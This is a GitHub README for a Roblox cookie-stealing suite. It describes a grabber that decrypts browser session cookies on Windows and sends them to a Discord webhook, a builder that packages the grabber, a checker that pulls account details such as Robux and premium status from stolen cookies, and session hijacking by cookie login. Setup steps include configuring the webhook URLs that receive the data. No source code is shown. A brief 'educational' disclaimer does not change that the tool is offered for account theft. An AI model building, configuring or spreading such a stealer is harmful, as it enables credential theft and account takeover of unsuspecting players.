# Roblox Tools

A Python-based suite of tools for managing Roblox cookies, including a cookie grabber, checker, and a menu interface with Cookie-Editor integration. These tools allow users to retrieve and decrypt Roblox cookies from the local system, validate cookies via Roblox APIs, and interact with cookies through a browser extension.

**⚠️ Disclaimer**: This project is for educational purposes only. Unauthorized access or misuse of user credentials violates Roblox's Terms of Service and may be illegal. Use responsibly and with explicit permission.

## Features
- **Cookie Grabber**: Retrieves and decrypts Roblox cookies from the local system and sends them to a Discord webhook.
- **Cookie Checker**: Validates a provided Roblox cookie and retrieves detailed account information (e.g., Robux, premium status, badges) via Roblox APIs, sending results to a Discord webhook.
- **Menu Interface**: Provides a user-friendly CLI menu to run the builder or checker and guides users through setting cookies using the Cookie-Editor browser extension.
- **Grabber builder**: It allows you to open a simple interface with file configuration options for the grabber.

## Prerequisites
- **Python 3.8+** installed on a Windows system (due to `pywin32` dependency for cookie decryption).
- **Google Chrome** or a Chromium-based browser for the Cookie-Editor extension.
- **Discord Webhooks** for receiving cookie data and account information.
- A working internet connection.

![Screenshot](https://i.imgur.com/nbmQov2.png)

## Installation

1. **Clone the Repository**
   ```bash
   git clone https://github.com/guapguap/Roblox-Tools.git
   cd roblox-tools
   ```

2. **Set Up a Virtual Environment (Optional but Recommended)**
   ```bash
   python -m venv venv
   .\venv\Scripts\activate
   ```

3. **Install Dependencies**
   Run the provided `SETUP.bat` to install required Python packages:
   ```bash
   requests, python-dotenv and pywin32
   ```

4. **Create the `.env` File**
   - Create a folder named `edit file in this folder` inside `C:\Users\YourUsername\Desktop\Roblox Tools`.
   - Inside this folder, create a file named `.env` with the following content:
     ```env
     WEBHOOK_URL_GRABBER=your_discord_webhook_url_for_grabber
     WEBHOOK_URL_CHECKER=your_discord_webhook_url_for_checker
     ```
   - Replace `your_discord_webhook_url_for_grabber` and `your_discord_webhook_url_for_checker` with your Discord webhook URLs. To create a webhook:
     1. Go to a Discord server where you have manage webhook permissions.
     2. Edit a channel, navigate to Integrations, and create a webhook.
     3. Copy the webhook URL and paste it into the `.env` file.

5. **Directory Structure**
   Ensure the following structure on your Desktop:
   ```
   Roblox Tools\
   ├── menu.py
   ├── edit file in this folder\
   │   └── .env
   └── scripts\
       └── checker.py
   ```

## Usage

1. **Run the Menu**
   Navigate to the `scripts` directory and run the menu script:
   ```bash
   cd Roblox Tools\scripts
   python menu.py/double click on menu.py
   ```
   The menu displays:
   ```
   Select an option:
   
   [1] Checker
   [2] Login by cookie
   [3] Builder
   [0] Exit
!!! CREDS TO @DankoOfficial, HE MADE THE CHECKER BUT I EDITED IT FROM BOT TO WEBHOOK !!!
